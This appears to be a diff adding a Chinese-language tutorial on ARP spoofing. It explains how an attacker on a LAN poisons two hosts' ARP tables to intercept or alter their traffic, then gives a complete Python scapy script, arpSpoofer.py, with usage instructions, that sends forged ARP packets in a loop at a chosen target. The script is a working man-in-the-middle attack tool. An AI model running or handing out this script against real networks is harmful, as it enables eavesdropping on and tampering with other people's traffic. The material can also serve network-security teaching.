@@ -1,0 +1,44 @@
+python 使用scapy库进行ARP欺骗
+
+1. 说明
+　　ARP欺骗（ARP spoofing），又称ARP病毒（ARP poisoning）或ARP攻击，是针对以太网地址解析协议（ARP）的一种攻击技术。此种攻击可让攻击者获取局域网上的数据包甚至可篡改数据包，且可让网络上特定电脑或所有电脑无法正常连接。最早探讨ARP欺骗的文章是由Yuri Volobue所写的《ARP与ICMP转向游戏》（ARP and ICMP redirection games）。
+　　由于局域网的网络流通不是根据IP地址进行，而是根据MAC地址进行传输。所以，MAC地址在主机A上被伪造成一个不存在的MAC地址，这样就会导致网络不通，主机A不能Ping通主机C！这就是一个简单的ARP欺骗。
+
+一个简单的例子：这里用一个最简单的案例来说明ARP欺骗的核心步骤。假设在一个 LAN 里，只有三台主机 A, B, C, 且 C 是攻击者。
+　　
+1. 攻击者聆听局域网上的MAC地址。它只要收到两台主机洪泛的ARP Request,就可以进行欺骗活动。
+2. 主机A，B都洪泛了ARP Request.攻击者现在有了两台主机的IP、MAC地址，开始攻击。
+攻击者发送一个 ARP Reply给主机B，把此包protocol header 里的sender IP设为A的IP地址， sender mac设为攻击者自己的MAC地址。
+3. 主机B收到ARP Reply后，更新它的ARP表，把主机 A的条目 (IP_A, MAC_A)改为(IP_A, MAC_C)。
+4. 当主机B要发送数据包给主机A时，它根据ARP表来封装数据包的Link报头，把目的MAC地址设为MAC_C,而非MAC_A.
+5. 当交换机收到B发送给A的数据包时，根据此包的目的MAC地址 (MAC_C) 而把数据包转发给攻击者C.
+6. 攻击者收到数据包后，可以把它存起来后再发送给A，达到偷听效果。攻击者也可以篡改数据后才发送数据包给A,造成伤害。
+
+2. python 代码
+#!/usr/bin/env python
+
+from scapy.all import *
+import sys, getopt
+
+def usage():
+        print "Usage: sudo ./arpSpoofer.py [-i interface] <target> <host>"
+
+def main(argv):
+        try:
+                opts, args = getopt.getopt(argv, "hi:t:")
+        except getopt.GetoptError:
+                usage()
+                sys.exit(2)
+        for opt, arg in opts:
+                if opt in ("-h"):
+                        usage()
+                        sys.exit()
+                elif opt in ("-i"):
+                        conf.iface = arg
+        if len(args) < 2:
+                usage()
+                sys.exit(2)
+        send(ARP(op="who-has", psrc=args[1], pdst=args[0]), loop=1, inter=0.5)
+
+if __name__ == "__main__":
+    main(sys.argv[1:])
